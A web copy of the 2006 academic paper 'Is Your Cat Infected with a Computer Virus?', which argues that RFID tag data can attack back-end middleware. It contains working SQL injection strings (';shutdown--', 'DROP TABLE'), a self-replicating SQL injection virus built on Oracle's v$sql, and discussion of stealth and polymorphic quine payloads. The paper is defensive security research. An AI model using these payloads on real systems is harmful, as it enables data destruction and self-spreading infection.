<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title>Melanie Rieback, Bruno Crispo, Andrew Tanenbaum 'Is Your Cat Infected with a Computer Virus?' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="Melanie Rieback, Bruno Crispo, Andrew Tanenbaum"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Rieback, Melanie; Crispo, Bruno; Tanenbaum, Andrew,Is Your Cat Infected with a Computer Virus?, security, quine, buffer, virus, rfid, middleware, worm, containercontents, source, container, secure, systems, injection, code, computer"/>
<meta name="Description" content="RFID systems as a whole are often treated with suspicion, but the input data received from individual RFID tags is implicitly trusted. RFID attacks are currently conceived as properly formatted but fake RFID data; however no one expects an RFID tag to send a SQL injection attack or a buffer overflow. This paper is meant to serve as a warning that data from RFID tags can be used to exploit back-end software systems. RFID middleware writers must therefore build appropriate checks (bounds checking, special character filtering, etc..), to prevent RFID middleware from suf- fering all of the well-known vulnerabilities experienced by the Internet. Furthermore, as a proof of concept, this paper presents the first self-replicating RFID virus. This virus uses RFID tags as a vector to compromise backend RFID middleware systems, via a SQL injection attack."/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"d703b1bd605fad6ec4650272a5dc250e8318ff82-1498756624-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/aat02.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Is Your Cat Infected with a Computer Virus?</h1><p><a href="/lib/?lang=en&amp;author=Rieback%2C%20Melanie">Melanie Rieback</a>, <a href="/lib/?lang=en&amp;author=Crispo%2C%20Bruno">Bruno Crispo</a>, <a href="/lib/?lang=en&amp;author=Tanenbaum%2C%20Andrew">Andrew Tanenbaum</a><br/> <em>Proc. 4th IEEE Intl. Conf. on Pervasive Computing and Communications. (PerCom 2006), Pisa, Italy, March 2006.</em><br/> <em>March 2006</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/aat02.html';</script><img src="/img/pdf.gif" alt="PDF"/><a href="/lib/pdf/Is%20Your%20Cat%20Infected%20with%20a%20Computer%20Virus%3F.pdf">Download</a> PDF (194.38Kb) (You need to be registered on <a href="/forum">forum</a>)<br/>[<a style="" href="/lib/?lang=EN&amp;index=VT#aat02">Back to index</a>] [<a href="/lib/aat02.html#disqus_thread">Comments</a>]<br/> 
 
<address>
Vrije Universiteit Amsterdam<br/>
Computer Systems Group<br/>
De Boelelaan 1081a, 1081 HV Amsterdam, Netherlands<br/>
{melanie,crispo,<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="19786a6d64597a6a376f6c377775">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>
</address>
<h2>Abstract</h2>
<p>RFID systems as a whole are often treated with suspicion, but the input data received from individual RFID tags is implicitly trusted. RFID attacks are currently conceived as properly formatted but fake RFID data; however no one expects an RFID tag to send a SQL injection attack or a buffer overflow. This paper is meant to serve as a warning that data from RFID tags can be used to exploit back-end software systems. RFID middleware writers must therefore build appropriate checks (bounds checking, special character filtering, etc..), to prevent RFID middleware from suf- fering all of the well-known vulnerabilities experienced by the Internet. Furthermore, as a proof of concept, this paper presents the first self-replicating RFID virus. This virus uses RFID tags as a vector to compromise backend RFID middleware systems, via a SQL injection attack.</p>
<h2>1. Introduction</h2>
<p>Years after the successful introduction of RFID-based pet tagging, Seth the veterinarian's pet identification system started displaying odd behavior. First, the RFID reader seemed to be reporting incorrect pet address data. A couple hours later, the system seemed to be erasing data from pets' RFID tags. Then the strangest thing of all happened: the LCD display on the pet identification computer froze and displayed the ominous message: "All your pet are belong to us."<sup><a href="#f1" name="b1">1</a></sup></p>
<p>Input data can be used by hackers to exploit back-end software systems. This is old news, but it has not prevented RFID system designers from implicitly trusting the structural integrity of data provided by RFID tags. RFID attacks are commonly conceived as properly formatted but fake RFID data. However, no one currently expects an RFID tag to send a SQL injection attack or a buffer overflow. This paper will demonstrate that the trust that RFID tag data receives is unfounded. The security breaches that RFID deployers dread most - RFID malware, RFID worms, and RFID viruses - are right around the corner. To prove our point, this paper will present the first self-replicating RFID virus. Our main intention behind this paper is to encourage RFID middleware designers to adopt safe programming practices. In this early stage of RFID deployment, SW developers still have the opportunity to "lock down" their RFID systems, to prepare them for the attacks described in this paper.</p>
<h3>1.1 Introduction to RFID</h3>
<p>Radio Frequency Identification (RFID) is the quintessential Pervasive Computing technology. Touted as the replacement for traditional barcodes, RFID's wireless identification capabilities promise to revolutionize our industrial, commercial, and medical experiences. The heart of the utility is that RFID makes gathering information about physical objects easy. Information about RFID tagged objects can be transmitted for multiple objects simultanously, through physical barriers, and from a distance. In line with Mark Weiser's concept of "ubiquitous computing"[20], RFID tags could turn our interactions with computing infrastructure into something subconscious and sublime.</p>
<p>This promise has led investors, inventors, and manufacturers to adopt RFID technology for a wide array of applications. RFID tags could help combat the counterfeiting of goods like designer sneakers, pharmaceutical drugs, and money. RFID-based automatic checkout systems might tally up and pay our bills at supermarkets, gas stations, and highways. We reaffirm our position as "top of the food chain" by RFID tagging cows, pigs, birds, and fish, thus enabling fine-grained quality control and infectious animal disease tracking. RFID technology also manages our supply chains, mediates our access to buildings, tracks our kids, and defends against grave robbers[6]. The family dog and cat even have RFID pet identification chips implanted in them; given the trend towards subdermal RFID use, their owner will be next in line.</p>
<h3>1.2 Well-Known RFID Threats</h3>
<p>This pervasive computing utopia also has its dark side. RFID automates information collection about individuals' locations and actions, and this data could be abused by hackers, retailers, and even the government. There are a number of well-established RFID security and privacy threats.</p>
<ol>
<li><strong>Sniffing.</strong> RFID tags are designed to be read by any compliant reading device. Tag reading may happen without the knowledge of the tag bearer, and it may also happen at large distances. One recent controversy highlighting this issue concerned the "skimming" of digital passports (a.k.a Machine Readable Travel Documents[4]).</li>
<li><strong>Tracking.</strong> RFID readers in strategic locations can record sightings of unique tag identifiers (or "constellations" of non-unique tag IDs), which are then associated with personal identities. The problem arises when individuals are tracked involuntarily. Subjects may be conscious of the unwanted tracking (i.e. school kids, senior citizens, and company employees), but that is not always necessarily the case.</li>
<li><strong>Spoofing.</strong> Attackers can create "authentic" RFID tags by writing properly formatted tag data on blank or rewritable RFID transponders. One notable spoofing attack was performed recently by researchers from Johns Hopkins University and RSA Security[8]. The researchers cloned an RFID transponder, using a sniffed (and decrypted) identifier, that they used to buy gasoline and unlock an RFID-based car immobilization system.</li>
<li><strong>Replay attacks.</strong> Attackers can intercept and retransmit RFID queries using RFID relay devices[14]. These retransmissions can fool digital passport readers, contactless payment systems, and building access control stations. Fortunately, implementing challengeresponse authentication between the RFID tags and back-end middleware improves the situation.</li>
<li><strong>Denial of Service.</strong> Denial of Service (DoS) is when RFID systems are prevented from functioning properly. Tag reading can be hindered by Faraday cages<sup><a href="#f2" name="b2">2</a></sup> or "signal jamming", both of which prevent radio waves from reaching RFID tagged objects. DoS can be disasterous in some situations, such as when trying to read medical data from VeriMed subdermal RFID chips in the trauma ward at the hospital.</li>
</ol>
<p>This list of categories represents the current state of "common knowledge" regarding security and privacy threats to RFID systems. This paper will (unfortunately) add a new category of threats to this list. All of the previously discussed threats relate to the high-level misuse of properly formatted RFID data, while the RFID malware described in this paper concerns the low-level misuse of improperly formatted RFID tag data.</p>
<h2>2 The Trouble with RFID Systems</h2>
<p>RFID malware is a Pandora's box that has been gathering dust in the corner of our "smart" warehouses and homes. While the idea of RFID viruses has surely crossed people's minds, the desire to see RFID technology succeed has suppressed any serious consideration of the concept. Furthermore, RFID exploits have not yet appeared "in the wild" so people conveniently figure that the power constraints faced by RFID tags make RFID installations invulnerable to such attacks.</p>
<p>Unfortunately, this viewpoint is nothing more than a product of our wishful thinking. RFID installations have a number of characteristics that make them outstanding candidates for exploitation by malware:</p>
<ol>
<li><strong>Lots of Source Code.</strong> RFID tags have power constraints that inherently limit complexity, but the back-end RFID middleware systems<sup><a href="#f3" name="b3">3</a></sup> may contain hundreds of thousands, if not millions, of lines of source code. If the number of software bugs averages between 6-16 per 1,000 lines of code[7], RFID middleware is likely to have lots of exploitable holes. In contrast, smaller "home-grown" RFID middleware systems will probably have fewer lines of code, but they will also most likely suffer from insufficient testing.</li>
<li><strong>Generic Protocols and Facilities.</strong> Building on existing Internet infrastructure is a scalable, cost-effective manner to develop RFID middleware. However, adopting Internet protocols also causes RFID middleware to inherit additional baggage, like well-known security vulnerabilities. The EPCglobal network exemplifies this trend, by adopting the Domain Name System (DNS), Uniform Resource Identifiers (URIs), and Extensible Markup Language (XML).</li>
<li><strong>Back-End Databases.</strong> The essence of RFID is automated data collection. However, the collected tag data must be stored and queried, to fulfill larger application purposes. Databases are thus a critical part of most RFID systems - a fact which is underscored by the involvement of traditional database vendors like SAP and Oracle with commercial RFID middleware development. The bad news is that databases are also susceptable to security breaches. Worse yet, they even have their own unique classes of attacks.</li>
<li><strong>High-Value Data.</strong> RFID systems are an attractive target for computer criminals. RFID data may have a financial or personal character, and it is sometimes even important for national security (i.e. the data on digital passports.) Making the situation worse, RFID malware could conceivably cause more damage than normal computer-based malware. This is because RFID malware has real-world side effects: besides harming back-end IT systems, it is also likely to harm tagged real-world objects.</li>
<li><strong>False Sense of Security.</strong> The majority of hack attacks exploit easy targets, and RFID systems are likely to be vulnerable because nobody expects RFID malware (yet); especially not in offline RFID systems. RFID middleware developers need to take measures to secure their systems (See Section 7), and we hope that this article will prompt them to do that.</li>
</ol>
<h2>3 RFID-Based Exploits</h2>
<p>RFID tags can directly exploit back-end RFID middleware. Skeptics might ask, "RFID tags are so resource limited that they cannot even protect themselves (i.e. with cryptography) - so how could they ever launch an attack?" The truth, however, is that RFID middleware exploitation requires more ingenuity than resources. The manipulation of less than 1 Kbits of on-tag RFID data can exploit security holes in RFID middleware, subverting its security, and perhaps even compromising the entire computer, or the entire network!</p>
<p>RFID tags can perform the following types of exploits:</p>
<ol>
<li><strong>Buffer overflows.</strong> Buffer overflows are one of the most common sources of security vulnerabilities in software. Found in both legacy and modern software, buffer overflows cost the software industry hundreds of millions of dollars per year. Buffer overflows have also played a prominent part in events of hacker legend and lore, including the Morris (1988), Code Red (2001), and SQL Slammer (2003) worms.
<p>Buffer overflows usually arise as a consequence of the improper use of languages such as C or C++ that are not "memory-safe." Functions without bounds checking (strcpy, strlen, strcat, sprintf, gets), functions with null termination problems (strncpy, snprintf, strncat), and user-created functions with pointer bugs are notorious buffer overflow enablers[1].</p>
<p>The life of a buffer overflow begins when an attacker inputs data either directly (i.e. via user input) or indirectly (i.e. via environment variables). This input data is deliberately longer then the allocated end of a buffer in memory, so it overwrites whatever else happened to be there. Since program control data is often located in the memory areas adjacent to data buffers, the buffer overflow can cause the program to execute arbitrary code[3].</p>
<p>RFID tags can exploit buffer overflows to compromise back-end RFID middleware systems. This is counterintuitive, since most RFID tags are limited to 1024 bits or less. However, commands like 'write multiple blocks' from ISO-15693 can allow a resourcepoor RFID tag to repeatedly send the same data block, with the net result of filling up an application-level buffer. Meticulous formatting of the repeatedly sent data block can still manage to overwrite a return address on the stack.</p>
<p>An attacker can also "cheat" and use contactless smart cards, which have a larger amount of available storage space. Better yet, an attacker can really blow RFID middleware's buffers away, by using a resource rich actively-powered RFID tag simulating device, like the RFID Guardian[17].</p>
</li>
<li><strong>Code Insertion.</strong> Malicious code can be injected into an application by an attacker, using any number of scripting languages including VBScript, CGI, Java, Javascript, and Perl. HTML insertion and Cross-Site Scripting (XSS) are common kinds of code insertion, and one tell-tale sign of these attacks is the presence of the following special characters in input data:
<tt>&lt; &gt; " ' % ; ) ( &amp; + -</tt>
<p>To perform code insertion attacks, hackers usually first craft malicious URLs, followed by "social engineering" efforts to trick users into clicking on them[2]. When activated, these scripts will execute attacks ranging from cookie stealing, to WWW session hijacking, to even exploiting web browser vulnerabilities in an attempt to compromise the entire computer.</p>
<p>RFID tags with data written in a scripting language can perform code insertion attacks on some back-end RFID middleware systems. If the RFID applications use web protocols to query back-end databases (as EPCglobal does), there is a chance that RFID middleware clients can interpret the scripting languages (perhaps because the software is implemented using a web client). If this is the case, then RFID middleware will be susceptable to the same code insertion problems as your typical web browsers.</p>
</li>
<li><strong>SQL injection.</strong> SQL injection is a type of code insertion attack that tricks a database into running SQL code that was not intended. Attackers have several objectives with SQL injection. First, they might want to "enumerate" (map out) the database structure. Then, the attackers might want to retrieve unauthorized data, or make equally unauthorized modifications or deletions. Databases also sometimes allow DB administrators to execute system commands. For example, Microsoft SQL Server executes commands using the 'xp cmdshell' stored procedure. The attacker might use this to compromise the computer system, by emailing the system's shadow password file to a certain location.
<p>RFID tag data can contain SQL injection attacks that exploit back-end RFID middleware databases. RFID tag data storage limitations are not a problem for these attacks because it is possible to do quite a lot of harm in a very small amount of SQL[5]. For example, the injected command:</p>
<div class="sql" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">;shutdown<span style="color: black; font-style: italic;">--</span></div>
<p>will shut down a SQL server instance, using only 12 characters of input. Another nasty command is:</p>
<div class="sql" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333; font-weight: bold;">DROP</span> <span style="color: #993333; font-weight: bold;">TABLE</span> <span style="color: #66cc66;">&lt;</span>tablename<span style="color: #66cc66;">&gt;</span></div>
<p>which will delete the specified database table. Just as with standard SQL injection attacks, if the DB is running as root, RFID tags can execute system commands which could compromise an entire computer, or even the entire network!</p>
</li>
</ol>
<h3>3.1 RFID-Based Worms</h3>
<p>A worm is a program that self-propagates across a network, exploiting security flaws in widely-used services. A worm is distinguishable from a virus in that a worm does not require any user activity to propagate[19]. Worms usually have a "payload", which performs activities ranging from deleting files, to sending information via email, to installing software patches. One of the most common payloads for a worm is to install a "backdoor" in the infected computer, which grants hackers easy return access to that computer system in the future.</p>
<p>An RFID worm propagates by exploiting security flaws in online RFID services. RFID worms do not necessarily require users to do anything (like scanning RFID tags) to propagate, although they will also happily spread via RFID tags, if given the opportunity.</p>
<p>The process begins when RFID worms first discover RFID middleware servers to infect over the Internet. They use network-based exploits as a "carrier mechanism" to transmit themselves onto the target. One example are attacks against EPCglobal's Object Naming Service (ONS) servers, which are susceptible to several common DNS attacks. (See [9] for more details.) These attacks can be automated, providing the propagation mechanism for an RFID worm.</p>
<p>RFID worms can also propagate via RFID tags. Worm-infected RFID middleware can "infect" RFID tags by overwriting their data with an on-tag exploit. This exploit causes new RFID middleware servers to download and execute some file from a remote location. The file would infect the RFID middleware server in the same manner as standard malware, thus launching a new instance of the RFID worm.</p>
<h2>4 RFID-Based Viruses</h2>
<p>While RFID worms rely upon the presence of a network connection, a truly self-replicating RFID virus is fully self-sufficient. This upcoming section will demonstrate how to create a self-replicating RFID virus, requiring only an infected RFID tag as an attack vector.</p>
<h3>4.1 Application Scenario</h3>
<p>We will start off our RFID virus discussion by introducing a hypothetical but realistic application scenario:</p>
<p>A supermarket distribution center employs a warehouse automation system with reusable RFID-tagged containers. Typical system operation is as follows: a pallet of containers containing a raw product (i.e. fresh produce) passes by an RFID reader upon arrival in the distribution center. The reader identifies and displays the products' serial numbers, and it forwards the information to a corporate database. The containers are then emptied, washed, and refilled with a packaged version of the same (or perhaps a different) product. An RFID reader then updates the container's RFID tag data to reflect the new cargo, and the refilled container is sent off to a local supermarket branch.</p>
<h4>4.1.1 Back-End Architecture</h4>
<p>The RFID middleware architecture for this system is not very complicated. The RFID system has several RFID readers at the front-end, and a database at the back-end. The RFID tags on the containers are read/write, and their data describes the cargo that is stored in the container. The back-end RFID database also stores information about the incoming and outgoing containers' cargo. For the sake of our discussion, let us say that the back-end database contains a table called NewContainerContents:</p>
<table border="1" summary="Table 1. NewContainerContents table">
<tr><th>TagID</th><th>ContainerContents</th></tr>
<tr><td>123</td><td>Apples</td></tr>
<tr><td>234</td><td>Pears</td></tr>
</table>
<p><strong>Table 1. NewContainerContents table</strong></p>
<p>This particular table lists the cargo contents for refilled containers. According to the table, the container with RFID tag #123 will be refilled with apples, and the container with RFID tag #234 will be refilled with pears.</p>
<h3>4.2 How The RFID Virus Works</h3>
<p>One day a container arrives in the supermarket distribution center that is carrying a surprising payload. The container's RFID tag is infected with a computer virus. This particular RFID virus uses SQL injection to attack the back-end RFID middleware systems.</p>
<p>When the container's RFID tag data is read, SQL injection code is unintentionally executed by the back-end database. This particular SQL injection attack simply appends a copy of its own code to all of the existing data in the ContainerContents row of the NewContainerContents database table. Later in the day, a different container is unloaded and refilled with new cargo. The warehouse management system writes the (modified) ContainerContents value into the RFID tag on that container, thus propagating the infection. The newly-infected container is then sent on its way, to infect other establishments' RFID automation systems (assuming use of the same middleware system). These RFID systems then infect other RFID tags, which infect other RFID middleware systems, etc..</p>
<p>Specifically, an RFID tag might contain the following data:</p>
<div class="sql" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">Contents<span style="color: #66cc66;">=</span>Raspberries;<span style="color: #993333; font-weight: bold;">UPDATE</span> NewContainerContents<br/>
<span style="color: #993333; font-weight: bold;">SET</span> ContainerContents <span style="color: #66cc66;">=</span> ContainerContents <span style="color: #66cc66;">||</span><br/>
<span style="color: #ff0000;">``</span>;<span style="color: black;">&#91;</span><span style="color: #993333; font-weight: bold;">SQL</span> Injection<span style="color: black;">&#93;</span><span style="color: #ff0000;">''</span>;<br/>
&nbsp;</div>
<p>The RFID system expects to receive the data before the semicolon. (In this case, the data describes the container contents, which happen to be freshly plucked raspberries.) The semicolon itself, however, is unexpected; it serves to conclude the current query, and begin a new one. The SQL injection attack is located after the semicolon.</p>
<h4>4.2.1 Dealing With Self-Reference</h4>
<p>This all sounds good in theory, but the SQL injection part remains to be filled in. Drawing from our previous formulation:</p>
<div class="sql" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black;">&#91;</span><span style="color: #993333; font-weight: bold;">SQL</span> Injection<span style="color: black;">&#93;</span> <span style="color: #66cc66;">=</span> <span style="color: #993333; font-weight: bold;">UPDATE</span> NewContainerContents<br/>
<span style="color: #993333; font-weight: bold;">SET</span> ContainerContents <span style="color: #66cc66;">=</span> ContainerContents <span style="color: #66cc66;">||</span><br/>
<span style="color: #ff0000;">``</span>;<span style="color: black;">&#91;</span><span style="color: #993333; font-weight: bold;">SQL</span> Injection<span style="color: black;">&#93;</span><span style="color: #ff0000;">''</span>;<br/>
&nbsp;</div>
<p>This SQL injection statement is self-referential, and we need a way to get around this. Here is one possible solution: Most databases have a command that will list the currently executing queries. This can be leveraged to fill in the selfreferential part of the RFID virus. For example, this is such a command in Oracle:</p>
<div class="sql" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333; font-weight: bold;">SELECT</span> SQL_TEXT <span style="color: #993333; font-weight: bold;">FROM</span> v$sql <span style="color: #993333; font-weight: bold;">WHERE</span> INSTR<span style="color: black;">&#40;</span><br/>
SQL_TEXT<span style="color: #66cc66;">,</span><span style="color: #ff0000;">'`'</span><span style="color: black;">&#41;</span><span style="color: #66cc66;">&gt;</span><span style="color: #cc66cc;">0</span>;<br/>
&nbsp;</div>
<p>There are similar commands in Postgres, MySQL, Sybase, and other database programs. Filling in the "get current query" command, our total RFID viral code now looks like:<sup><a href="#f4" name="b4">4</a></sup></p>
<div class="sql" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">Contents<span style="color: #66cc66;">=</span>Raspberries;<br/>
<span style="color: #993333; font-weight: bold;">UPDATE</span> NewContainerContents <span style="color: #993333; font-weight: bold;">SET</span> ContainerContents<span style="color: #66cc66;">=</span><br/>
ContainerContents <span style="color: #66cc66;">||</span> <span style="color: #ff0000;">';'</span> <span style="color: #66cc66;">||</span> CHR<span style="color: black;">&#40;</span><span style="color: #cc66cc;">10</span><span style="color: black;">&#41;</span> <span style="color: #66cc66;">||</span> <span style="color: black;">&#40;</span><span style="color: #993333; font-weight: bold;">SELECT</span><br/>
SQL_TEXT <span style="color: #993333; font-weight: bold;">FROM</span> v$sql <span style="color: #993333; font-weight: bold;">WHERE</span> INSTR<span style="color: black;">&#40;</span>SQL_TEXT<span style="color: #66cc66;">,</span><span style="color: #ff0000;">'`'</span><span style="color: black;">&#41;</span><span style="color: #66cc66;">&gt;</span><span style="color: #cc66cc;">0</span><span style="color: black;">&#41;</span>;<br/>
&nbsp;</div>
<p>The self-reproductive capabilities of this RFID virus are now complete.</p>
<h2>5 Optimizations</h2>
<p>The RFID virus, as it was just described, has a lot of room for improvement. This section will introduce optimizations for increasing viral stealth and generality.</p>
<h3>5.1 Increased Stealth</h3>
<p>The RFID virus is not very stealthy. The SQL injection attack makes obvious changes to the database tables, which can be casually spotted by a database administrator.</p>
<p>To solve this problem, RFID viruses can hide the modifications they make. For example, the SQL injection payload could create and use stored procedures to infect RFID tags, while leaving the database tables unmodified. Since DB administrators do not examine stored procedure code as frequently as they examine table data, it is likely to take them longer to notice the infection. However, the disadvantage of using stored procedures is that each brand of database has its own built-in programming language. So the resulting virus will be reasonably database-specific.</p>
<p>On the other hand, stealth might not even be that important for RFID viruses. A database administrator might spot and fix the viral infection, but the damage has already been done if even a single infected RFID-tagged container has left the premises.</p>
<h3>5.2 Increased Generality</h3>
<p>Another problem with the previously described RFID virus is that it relies upon a certain underlying database structure, thus limiting the virus' reproductive ability to a specific middleware configuration. An improvement would be to create a more generic viral reproductive mechanism, which can potentially infect a wider variety of RFID deployments.</p>
<p>One way to create a more generic RFID virus is to eliminate the name of the table and columns from the reproductive mechanism. The SQL injection attack could instead append data to the multiple tables and columns that happen to be present. The downside of this approach is that it is difficult to control - if data is accidentally appended to the TagID column, the virus will not even reproduce anymore!</p>
<h3>5.3 Adding Generality with Quines</h3>
<p>The RFID virus can achieve further generality by self-reproducing without the aid of the DB-specific command "get current query". One way for our RFID virus to do this is to use a SQL quine.<sup><a href="#f5" name="b5">5</a></sup></p>
<p>A quine is a program that prints its own source code. Douglas R. Hofstadter coined the term 'quine' in his book 'Godel, Escher, Bach'[11], in honor of Willard van Orman Quine who first introduced the concept. A few basic principles apply when trying to write self-reproducing code. The most important principle is that quines consist of a "code" and "data" portion. The data portion represents the textual form of the quine. The code uses the data to print the code, and then uses the data to print the data. Hofstadter clarifies this by making the following analogy to cellular biology: the "code" of a quine is like a cell, and the "data" is the cell's DNA. The DNA contains all of the necessary information for cell replication. However, when a cell uses the DNA to create a new cell, it also replicates the DNA itself.</p>
<p>Now that we understand what a quine is, we want to write one in SQL. Here is one example of a SQL quine (PostgreSQL)[13]:</p>
<div class="sql" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333; font-weight: bold;">SELECT</span> substr<span style="color: black;">&#40;</span><span style="color: #993333; font-weight: bold;">SOURCE</span><span style="color: #66cc66;">,</span><span style="color: #cc66cc;">1</span><span style="color: #66cc66;">,</span><span style="color: #cc66cc;">93</span><span style="color: black;">&#41;</span> <span style="color: #66cc66;">||</span> chr<span style="color: black;">&#40;</span><span style="color: #cc66cc;">39</span><span style="color: black;">&#41;</span> <span style="color: #66cc66;">||</span> <span style="color: #993333; font-weight: bold;">SOURCE</span> <span style="color: #66cc66;">||</span><br/>
chr<span style="color: black;">&#40;</span><span style="color: #cc66cc;">39</span><span style="color: black;">&#41;</span> <span style="color: #66cc66;">||</span> substr<span style="color: black;">&#40;</span><span style="color: #993333; font-weight: bold;">SOURCE</span><span style="color: #66cc66;">,</span><span style="color: #cc66cc;">94</span><span style="color: black;">&#41;</span> <span style="color: #993333; font-weight: bold;">FROM</span> <span style="color: black;">&#40;</span><span style="color: #993333; font-weight: bold;">SELECT</span> <span style="color: #ff0000;">'SELECT<br/>
substr(source,1,93) || chr(39) || source || chr(39)<br/>
|| substr(source,94) FROM (SELECT ::text as source)<br/>
q;'</span>::text <span style="color: #993333; font-weight: bold;">AS</span> <span style="color: #993333; font-weight: bold;">SOURCE</span><span style="color: black;">&#41;</span> q;<br/>
&nbsp;</div>
<p>This SQL quine simply reproduces itself - and does nothing more.</p>
<h3>5.3.1 Adding Payloads as Introns</h3>
<p>Self-replicating SQL code is purely a mental exercise until it does something functional. We would like to add viral "payloads" to the SQL quine, but we do not want to harm its self-reproductive ability. To achieve this, we can use "introns", which are pieces of quine data that are not used to output the quine code, but that are still copied when the data is written to the output. The term "intron" is a continuation of Hofstadter's analogy, who compared non-essential quine data with the portions of DNA that are not used to produce proteins. A quine's introns are reproduced along with a quine, but they are not necessary to the self-reproducing ability of the quine. Therefore, an intron can be modified without a reproductive penalty; making introns the perfect place to put SQL injection attacks.</p>
<h4>5.3.2 Polymorphic RFID Viruses</h4>
<p>A polymorphic virus is a virus that changes its binary signature every time it replicates, hindering detection by antivirus programs.</p>
<p>We can use "multi-quines" to create polymorphic RFID viruses. A multi-quine is a set of programs that print their own source code, unless given particular inputs, which cause the programs to print the code of another program in the set[15]. Multi-quines work using introns; the intron of a first program represents the code of a second program, and the intron of the second program represents the code of the first. Multi-quine polymorphic RFID viruses work in the same way: when the virus is passed a particular parameter, it produces a representation of the second virus; and vice-versa. The varying parameter could be a timestamp, or some quality of the RFID back-end database that is currently being infected.</p>
<p>To make the virus truly undetectable by antiviral signature matching, encryption would also be necessary to obscure the RFID virus' code portion. Amazingly enough, David Madore has already demonstrated this possibility - he wrote a quine (in C) that stores its own code enciphered with the blowfish cryptographic algorithm in its data[15]. Unfortunately, this quine is sufficiently large that it no longer reasonably fits on a contactless smart card. However, it does serve as a remarkable example of what can be achieved using a hearty dose of brain-power and fully self-reproducing code!</p>
<h2>6 Implementation</h2>
<p>Yogi Berra once said, "In theory there is no difference between theory and practice. In practice there is." For that reason, we have implemented our RFID malware ideas, to test them for their real-world applicability.</p>
<h3>6.1 Detailed Example: Oracle/SSI Virus</h3>
<p>This section will give a detailed description of an RFID virus implementation that specifically targets Oracle and Apache Server-Side Includes (SSIs). This RFID virus combines self-replication with a malicous payload, and the virus leverages both SQL and script injection attacks. It is also small enough to fit on a low-cost RFID tag, with only 127 characters.</p>
<h4>6.1.1 Back-End Architecture</h4>
